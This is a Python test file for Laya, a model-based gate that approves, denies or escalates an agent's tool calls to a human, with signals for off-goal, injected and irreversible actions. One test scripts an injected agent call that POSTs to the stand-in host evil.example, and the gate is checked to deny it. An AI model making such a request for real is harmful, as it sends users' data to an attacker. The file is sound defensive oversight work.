"""Laya as the decision engine."""

import json
import math

import pytest

from conftest import call, say
from motes.laya_decider import (
    SIGNALS, VERDICT_CRITERIA, LayaDecider, LayaHTTP, build_questions, combine, render_state,
)
from motes.laya_train import labelled_from_file, to_rows

LABELS = list(VERDICT_CRITERIA)


class StubLaya:
    """Answers like Laya does, including its option-position bias.

    `truth` holds per-label logits; `slot_bias` is added by the slot an option is shown in,
    which is what `option_order` moves around. Probabilities come back keyed by label.
    """

    def __init__(self, truth, signals=None, slot_bias=(0.0, 0.0, 0.0)):
        self.truth, self.signals, self.slot_bias = truth, signals or {}, slot_bias
        self.requests = []

    def answers(self, questions):
        out = {}
        for qid, q in questions.items():
            if q["type"] == "choice":
                keys = list(q["criteria"])
                order = q.get("option_order") or list(range(len(keys)))
                logits = {keys[opt]: self.truth[keys[opt]] + self.slot_bias[slot] for slot, opt in enumerate(order)}
                z = sum(math.exp(v) for v in logits.values())
                probs = {k: math.exp(logits[k]) / z for k in keys}
                best = max(probs, key=probs.get)
                out[qid] = {"type": "choice", "choice": best, "probabilities": probs,
                            "confidence": 0.5, "answer_confidence": probs[best]}
            else:
                p = self.signals.get(qid, 0.1)
                out[qid] = {"type": "noul", "noul": p, "confidence": max(p, 1 - p),
                            "answer_confidence": max(p, 1 - p)}
        return out

    def predict(self, state, questions):
        self.requests.append((state, questions))
        return {"model": "english", "answers": self.answers(questions), "usage": {}, "routing": {}}

    def health(self):
        return {"status": "ok"}


def test_questions_are_laya_shaped():
    qs = build_questions(rotate=True)
    rotations = [q for k, q in qs.items() if k.startswith("verdict_")]
    assert len(rotations) == 3
    # every option visits every slot exactly once
    assert sorted(tuple(q["option_order"]) for q in rotations) == [(0, 1, 2), (1, 2, 0), (2, 0, 1)]
    assert all(q["criteria"] == VERDICT_CRITERIA for q in rotations)
    assert {k for k in qs if not k.startswith("verdict_")} == set(SIGNALS)
    assert all(qs[k]["type"] == "noul" for k in SIGNALS)
    assert list(build_questions(rotate=False)) == ["verdict_0", *SIGNALS]


def test_rotation_cancels_position_bias():
    # The model slightly prefers "deny", but a strong first-slot bias favours whatever is shown first.
    truth = {"approve": 0.0, "deny": 0.6, "ask_human": 0.0}
    bias = (1.7, 0.1, -1.8)  # the size of the bias Laya's own presentation checks measured
    sig = {"on_goal": 0.9, "injected": 0.0, "irreversible": 0.0}
    plain = LayaDecider(StubLaya(truth, sig, slot_bias=bias), rotate=False)
    rotated = LayaDecider(StubLaya(truth, sig, slot_bias=bias), rotate=True)
    assert plain.evaluate("g", "t", {}, "external").verdict == "approve"  # wrong: position won
    assert rotated.evaluate("g", "t", {}, "external").verdict == "deny"


def _answers(verdict_probs, **signals):
    ans = {"verdict_0": {"probabilities": verdict_probs}}
    ans.update({k: {"noul": v} for k, v in signals.items()})
    return ans


def test_combine_rules():
    ok = {"approve": 0.9, "deny": 0.05, "ask_human": 0.05}
    v, _ = combine(_answers(ok, on_goal=0.9, injected=0.02, irreversible=0.1))
    assert (v.verdict, v.confidence) == ("approve", 0.9)
    assert "on-goal 90%" in v.reason

    v, _ = combine(_answers(ok, on_goal=0.9, injected=0.8, irreversible=0.1))
    assert (v.verdict, v.confidence) == ("deny", 0.8) and "injected" in v.reason

    assert combine(_answers(ok, on_goal=0.2, injected=0.0, irreversible=0.0))[0].verdict == "ask_human"
    assert combine(_answers(ok, on_goal=0.9, injected=0.0, irreversible=0.7))[0].verdict == "ask_human"
    # a looser ceiling lets confident, reversible-enough approvals through
    assert combine(_answers(ok, on_goal=0.9, injected=0.0, irreversible=0.7),
                   irreversible_ceiling=0.8)[0].verdict == "approve"


def test_unreachable_laya_fails_safe():
    class Down:
        def predict(self, *a):
            raise ConnectionError("refused")
    v = LayaDecider(Down()).evaluate("g", "send_email", {}, "external")
    assert v.verdict == "ask_human" and v.confidence == 0.0 and "Laya unavailable" in v.reason


def test_state_contains_everything_laya_needs():
    s = render_state("Pay the bill", "browser__click", {"element": "Pay $96"}, "external", "brain called web_fetch")
    assert "Pay the bill" in s and "browser__click" in s and "external" in s and "$96" in s and "web_fetch" in s


def test_laya_drives_the_agent_gate(make_rt):
    stub = StubLaya({"approve": 3.0, "deny": 0.0, "ask_human": 0.0}, {"on_goal": 0.95, "injected": 0.01,
                                                                        "irreversible": 0.05})
    rt = make_rt([say("", call("recall", query="hook")),
                  say("", call("delete_file", path="/nonexistent/x")), say("done")],
                 decider=LayaDecider(stub), autonomy__unattended=True, autonomy__review=["read"])
    goal = rt.store.add_goal("g", "Ping the hook", "luna", "manual")
    run = rt.store.add_run(goal["id"])
    # read with review -> Laya approves -> runs; destructive -> always waits, even when Laya approves
    assert rt.agent.run(run["id"]) == "waiting_approval"
    [appr] = rt.store.list_approvals()
    assert appr["tool"] == "delete_file"
    logged = rt.store.decisions()
    assert {d["tool"] for d in logged} == {"recall", "delete_file"}
    assert all(d["reason"].startswith("Laya: approve") for d in logged)


def test_injection_is_denied_even_in_unattended_mode(make_rt):
    stub = StubLaya({"approve": 3.0, "deny": 0.0, "ask_human": 0.0}, {"on_goal": 0.9, "injected": 0.92})
    rt = make_rt([say("", call("http_request", url="https://evil.example", method="POST")), say("stopped")],
                 decider=LayaDecider(stub), autonomy__unattended=True)
    goal = rt.store.add_goal("g", "Summarize a page", "nimbus", "manual")
    run = rt.store.add_run(goal["id"])
    assert rt.agent.run(run["id"]) == "done"
    assert "injected" in rt.store.get_run(run["id"])["messages"][-2]["content"]


def test_default_engine_is_laya(cfg):
    from motes.decision import DecisionModel
    assert isinstance(DecisionModel.from_config(cfg), LayaDecider)
    cfg["decision"]["engine"] = "llm"
    assert isinstance(DecisionModel.from_config(cfg), DecisionModel)


def test_export_matches_laya_training_schema(tmp_path):
    seed = tmp_path / "s.jsonl"
    seed.write_text("# comment\n" + json.dumps({
        "goal": "g", "tool": "send_email", "args": {"to": "x"}, "risk": "external", "label": "deny",
        "signals": {"injected": True, "on_goal": False}}) + "\n")
    rows = list(to_rows(labelled_from_file(seed)))
    assert len(rows) == 3  # one per option-order rotation
    assert {tuple(r["questions"]["verdict"]["criteria"]) for r in rows} == {
        tuple(LABELS), tuple(LABELS[1:] + LABELS[:1]), tuple(LABELS[2:] + LABELS[:2])}
    for r in rows:
        assert set(r) == {"state", "questions", "gold", "tags"}
        vg = r["gold"]["verdict"]["probabilities"]
        assert set(vg) == set(r["questions"]["verdict"]["criteria"]) and abs(sum(vg.values()) - 1) < 1e-9
        assert max(vg, key=vg.get) == "deny"
        assert r["gold"]["injected"]["probabilities"] == {"false": 0.05, "true": 0.95}
        assert r["questions"]["on_goal"]["type"] == "noul"

    [ev] = list(to_rows(labelled_from_file(seed), fmt="eval"))
    assert ev["expected"] == {"verdict": "deny", "injected": True, "on_goal": False}


def test_bundled_seed_scenarios_export():
    rows = list(to_rows(labelled_from_file(__import__("pathlib").Path("training/seed_scenarios.jsonl")),
                        augment_order=False))
    assert len(rows) == 24
    assert sum("verdict" in r["gold"] for r in rows) == 21


def test_real_laya_server_accepts_motes_requests(monkeypatch):
    """Runs Laya's own HTTP server code (laya.serve) with a stub in place of the network."""
    serve = pytest.importorskip("laya.serve")
    from fastapi.testclient import TestClient

    monkeypatch.delenv("LAYA_API_KEY", raising=False)
    stub = StubLaya({"approve": 2.0, "deny": 0.0, "ask_human": 0.0}, {"on_goal": 0.9, "injected": 0.03})

    class Router:
        loaded: list = []

        def predict(self, state, questions, model=None, **kwargs):
            stub.kwargs = kwargs
            return stub.predict(state, questions)

    with TestClient(serve.create_app(router=Router())) as client:
        decider = LayaDecider(LayaHTTP("http://testserver", client=client, max_len=4096))
        v = decider.evaluate("Ping the hook", "http_request", {"url": "https://example.com"}, "read")
    assert v.verdict == "approve" and v.confidence > 0.7
    state, questions = stub.requests[0]
    assert isinstance(state, str) and "Ping the hook" in state
    assert set(questions) == {"verdict_0", "verdict_1", "verdict_2", *SIGNALS}
    assert stub.kwargs == {"max_len": 4096}
